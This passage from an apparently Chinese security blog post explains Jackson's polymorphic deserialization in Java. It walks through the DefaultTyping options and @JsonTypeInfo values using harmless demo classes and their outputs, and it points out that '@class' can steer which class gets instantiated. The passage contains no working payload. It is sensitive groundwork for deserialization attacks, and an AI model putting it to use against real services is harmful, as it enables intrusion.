punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JSTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Person p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"mi1k7ea"</span><span class="token punctuation">;</span>        ObjectMapper mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 序列化</span>        String json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 反序列化</span>        Person p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果</p><pre><code>{&quot;age&quot;:6,&quot;name&quot;:&quot;mi1k7ea&quot;}Person.age=6, Person.name=mi1k7ea</code></pre><p><img src="/img/JacksonDeserialization/image-20211029172644720.png" alt="image-20211029172644720"></p><h2 id="0x02-多态-JacksonPolymorphicDeserialization"><a href="#0x02-多态-JacksonPolymorphicDeserialization" class="headerlink" title="0x02 多态 JacksonPolymorphicDeserialization"></a>0x02 多态 JacksonPolymorphicDeserialization</h2><p>DefaultTyping和@JsonTypeInfo注解</p><h3 id="1-DefaultTyping"><a href="#1-DefaultTyping" class="headerlink" title="1. DefaultTyping"></a>1. DefaultTyping</h3><pre class="line-numbers language-JAVA"><code class="language-JAVA">public static enum DefaultTyping {  JAVA_LANG_OBJECT,  OBJECT_AND_NON_CONCRETE,  NON_CONCRETE_AND_ARRAYS,  NON_FINAL;  private DefaultTyping() {  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：</p><table><thead><tr><th align="left">DefaultTyping类型</th><th align="left">描述说明</th></tr></thead><tbody><tr><td align="left">JAVA_LANG_OBJECT</td><td align="left">属性的类型为Object</td></tr><tr><td align="left">OBJECT_AND_NON_CONCRETE</td><td align="left">属性的类型为Object、Interface、AbstractClass</td></tr><tr><td align="left">NON_CONCRETE_AND_ARRAYS</td><td align="left">属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td align="left">NON_FINAL</td><td align="left">所有除了声明为final之外的属性</td></tr></tbody></table><h4 id="1-1-JAVA-LANG-OBJECT"><a href="#1-1-JAVA-LANG-OBJECT" class="headerlink" title="1-1. JAVA_LANG_OBJECT"></a>1-1. JAVA_LANG_OBJECT</h4><p>JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个Object类型时，会对该Object类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化的类）</p><p>Hacker.java</p><pre class="line-numbers language-JAVA"><code class="language-JAVA">package com.DemoJackson.Study.DemoDefaultTyping.Demo1JavaLangObject;public class Hacker {    public String skill = "Jackson";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Person.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoDefaultTyping<span class="token punctuation">.</span>Demo1JavaLangObject<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> String name<span class="token punctuation">;</span>    <span class="token keyword">public</span> Object object<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JSTest.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 通过enableDefaultTyping()设置设置JAVA_LANG_OBJECT后，会多输出Hacker类名</span><span class="token comment" spellcheck="true">// 且在输出的Object属性时直接输出的是Hacker类对象，也就是说同时对Object属性对象进行了序列化和反序列化操作</span><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoDefaultTyping<span class="token punctuation">.</span>Demo1JavaLangObject<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JSTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Person p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"mi1k7ea"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置JAVA_LANG_OBJECT</span>        ObjectMapper mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span>ObjectMapper<span class="token punctuation">.</span>DefaultTyping<span class="token punctuation">.</span>JAVA_LANG_OBJECT<span class="token punctuation">)</span><span class="token punctuation">;</span>        String json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        Person p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果输出了Hacker对象，说明对Person.Object的对象Hacker序列化和反序列化了。</p><p><img src="/img/JacksonDeserialization/image-20211029173244915.png" alt="image-20211029173244915"></p><h4 id="1-2-OBJECT-AND-NON-CONCRETE"><a href="#1-2-OBJECT-AND-NON-CONCRETE" class="headerlink" title="1-2. OBJECT_AND_NON_CONCRETE"></a>1-2. OBJECT_AND_NON_CONCRETE</h4><p>OBJECT_AND_NON_CONCRETE：不仅仅对Object类，对Interface、AbstractClass类也会进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。此外，<strong>enableDefaultTyping()默认的无参数的设置就是此选项。</strong></p><p>Sex.java</p><pre class="line-numbers language-JAVA"><code class="language-JAVA">package com.DemoJackson.Study.DemoDefaultTyping.Demo2ObjectAndNonConcrete;public interface Sex {    public void setSex(int sex);    public int getSex();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>MySex.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoDefaultTyping<span class="token punctuation">.</span>Demo2ObjectAndNonConcrete<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySex</span> <span class="token keyword">implements</span> <span class="token class-name">Sex</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> sex<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JSTest.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有Interface、AbstractClass类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。</span><span class="token comment" spellcheck="true">// enableDefaultTyping()默认的无参数的设置就是此选项。</span><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoDefaultTyping<span class="token punctuation">.</span>Demo2ObjectAndNonConcrete<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JSTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Person p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"mi1k7ea"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置OBJECT_AND_NON_CONCRETE</span>        ObjectMapper mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span>ObjectMapper<span class="token punctuation">.</span>DefaultTyping<span class="token punctuation">.</span>OBJECT_AND_NON_CONCRETE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//mapper.enableDefaultTyping();      // 或直接无参调用，输出一样</span>        String json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        Person p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到接口Interface也能够序列化和反序列化</p><p><img src="/img/JacksonDeserialization/image-20211029174011694.png" alt="image-20211029174011694"></p><h4 id="1-3-NON-CONCRETE-AND-ARRAYS"><a href="#1-3-NON-CONCRETE-AND-ARRAYS" class="headerlink" title="1.3. NON_CONCRETE_AND_ARRAYS"></a>1.3. NON_CONCRETE_AND_ARRAYS</h4><p>NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持Array类型。</p><p>JSTest.java</p><pre class="line-numbers language-JAVA"><code class="language-JAVA">// 对Array类型成功进行了序列化和反序列化// 类名变成了 [L类名package com.DemoJackson.Study.DemoDefaultTyping.Demo3NonCconcreteAndArrays;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest {    public static void main(String[] args) throws Exception {        Person p = new Person();        p.age = 6;        p.name = "mi1k7ea";        p.sex = new MySex();        // object属性是Hacker类的数组        Hacker[] hackers = new Hacker[2];        hackers[0] = new Hacker();        hackers[1] = new Hacker();        p.object = hackers;        // 设置NON_CONCRETE_AND_ARRAYS        ObjectMapper mapper = new ObjectMapper();        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);        String json = mapper.writeValueAsString(p);        System.out.println(json);        Person p2 = mapper.readValue(json, Person.class);        System.out.println(p2);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果: 数组的类名变成了 <code>[L类名</code> </p><p><code>[Lcom.DemoJackson.Study.DemoDefaultTyping.Demo3NonCconcreteAndArrays.Hacker</code></p><pre><code>{&quot;age&quot;:6,&quot;name&quot;:&quot;mi1k7ea&quot;,&quot;object&quot;:[&quot;[Lcom.DemoJackson.Study.DemoDefaultTyping.Demo3NonCconcreteAndArrays.Hacker;&quot;,[{&quot;skill&quot;:&quot;Jackson&quot;},{&quot;skill&quot;:&quot;Jackson&quot;}]],&quot;sex&quot;:[&quot;com.DemoJackson.Study.DemoDefaultTyping.Demo3NonCconcreteAndArrays.MySex&quot;,{&quot;sex&quot;:0}]}Person.age=6, Person.name=mi1k7ea, [Lcom.DemoJackson.Study.DemoDefaultTyping.Demo3NonCconcreteAndArrays.Hacker;@6093dd95, com.DemoJackson.Study.DemoDefaultTyping.Demo3NonCconcreteAndArrays.MySex@5622fdf</code></pre><p><img src="/img/JacksonDeserialization/image-20211029174333003.png" alt="image-20211029174333003"></p><h4 id="1-4-NON-FINAL"><a href="#1-4-NON-FINAL" class="headerlink" title="1.4. NON_FINAL"></a>1.4. NON_FINAL</h4><p>NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。</p><p>Person.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoDefaultTyping<span class="token punctuation">.</span>Demo4NonFinal<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoDefaultTyping<span class="token punctuation">.</span>Demo2ObjectAndNonConcrete<span class="token punctuation">.</span>Sex<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> String name<span class="token punctuation">;</span>    <span class="token keyword">public</span> Object object<span class="token punctuation">;</span>    <span class="token keyword">public</span> Sex sex<span class="token punctuation">;</span>    <span class="token keyword">public</span> Hacker hacker<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s, %s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">,</span> sex <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">,</span> hacker <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> hacker<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JSTest.java</p><pre class="line-numbers language-JAVA"><code class="language-JAVA">// 对非final的hacker属性进行序列化和反序列化package com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest {    public static void main(String[] args) throws Exception {        Person p = new Person();        p.age = 6;        p.name = "mi1k7ea";        p.object = new Hacker();        p.sex = new MySex();        p.hacker = new Hacker();        // 设置NON_FINAL        ObjectMapper mapper = new ObjectMapper();        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);        String json = mapper.writeValueAsString(p);        System.out.println(json);        Person p2 = mapper.readValue(json, Person.class);        System.out.println(p2);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：可以看到序列化和反序列化了hacker属性，是因为设置了NON_FINAL属性，所以Person类的Hacker属性是Hacker类也能序列化和反序列化。</p><pre><code>[&quot;com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.Person&quot;,{&quot;age&quot;:6,&quot;name&quot;:&quot;mi1k7ea&quot;,&quot;object&quot;:[&quot;com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.Hacker&quot;,{&quot;skill&quot;:&quot;Jackson&quot;}],&quot;sex&quot;:[&quot;com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.MySex&quot;,{&quot;sex&quot;:0}],&quot;hacker&quot;:[&quot;com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.Hacker&quot;,{&quot;skill&quot;:&quot;Jackson&quot;}]}]Person.age=6, Person.name=mi1k7ea, com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.Hacker@3ffc5af1, com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.MySex@5e5792a0, com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.Hacker@26653222</code></pre><p><img src="/img/JacksonDeserialization/image-20211029174829906.png" alt="image-20211029174829906"></p><p>如果不设置NON_FINAL属性</p><p>结果：可以看到Person类的Hacker属性是不被序列化的</p><pre><code>{&quot;age&quot;:6,&quot;name&quot;:&quot;mi1k7ea&quot;,&quot;object&quot;:[&quot;com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.Hacker&quot;,{&quot;skill&quot;:&quot;Jackson&quot;}],&quot;sex&quot;:[&quot;com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.MySex&quot;,{&quot;sex&quot;:0}],&quot;hacker&quot;:{&quot;skill&quot;:&quot;Jackson&quot;}}Person.age=6, Person.name=mi1k7ea, com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.Hacker@3ffc5af1, com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.MySex@5e5792a0, com.DemoJackson.Study.DemoDefaultTyping.Demo4NonFinal.Hacker@26653222</code></pre><p><img src="/img/JacksonDeserialization/image-20211029175310571.png" alt="image-20211029175310571"></p><h3 id="2-JsonTypeInfo注解"><a href="#2-JsonTypeInfo注解" class="headerlink" title="2.@JsonTypeInfo注解"></a>2.@JsonTypeInfo注解</h3><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p><pre><code>@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</code></pre><h4 id="1-NONE"><a href="#1-NONE" class="headerlink" title="1.NONE"></a>1.NONE</h4><p>不对Person类的object属性序列化和反序列化</p><p>Person.java</p><pre class="line-numbers language-JAVA"><code class="language-JAVA">package com.DemoJackson.Study.DemoJsonTypeInfo.Demo1None;import com.fasterxml.jackson.annotation.JsonTypeInfo;public class Person {    public int age;    public String name;    @JsonTypeInfo(use = JsonTypeInfo.Id.NONE)    public Object object;    @Override    public String toString() {        return String.format("Person.age=%d, Person.name=%s, %s", age, name, object == null ? "null" : object);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JSTest.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 和没有设置值为JsonTypeInfo.Id.NONE的@JsonTypeInfo注解是一样的</span><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoJsonTypeInfo<span class="token punctuation">.</span>Demo1None<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JSTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Person p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"mi1k7ea"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectMapper mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        Person p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Person类的object属性并没有序列化和反序列化</p><p><img src="/img/JacksonDeserialization/image-20211029190727452.png" alt="image-20211029190727452"></p><h4 id="2-CLASS"><a href="#2-CLASS" class="headerlink" title="2.CLASS"></a>2.CLASS</h4><p>Person.java</p><pre class="line-numbers language-JAVA"><code class="language-JAVA">package com.DemoJackson.Study.DemoJsonTypeInfo.Demo2CLASS;import com.fasterxml.jackson.annotation.JsonTypeInfo;public class Person {    public int age;    public String name;    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)    public Object object;    @Override    public String toString() {        return String.format("Person.age=%d, Person.name=%s, %s", age, name, object == null ? "null" : object);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>object属性中多了”@class”:”xxxxxxx.Hacker”，说明对object属性的值序列化和反序列化了。</p><p>那么也就是说，<strong>在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过@class的方式指定相关类，并进行相关调用。</strong></p><p><img src="/img/JacksonDeserialization/image-20211029190839098.png" alt="image-20211029190839098"></p><h4 id="3-MINIMAL-CLASS"><a href="#3-MINIMAL-CLASS" class="headerlink" title="3.MINIMAL_CLASS"></a>3.MINIMAL_CLASS</h4><p>Person.java</p><pre class="line-numbers language-JAVA"><code class="language-JAVA">package com.DemoJackson.Study.DemoJsonTypeInfo.Demo3MinimalClass;import com.fasterxml.jackson.annotation.JsonTypeInfo;public class Person {    public int age;    public String name;    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)    public Object object;    @Override    public String toString() {        return String.format("Person.age=%d, Person.name=%s, %s", age, name, object == null ? "null" : object);    }}<span aria-hidden="true" 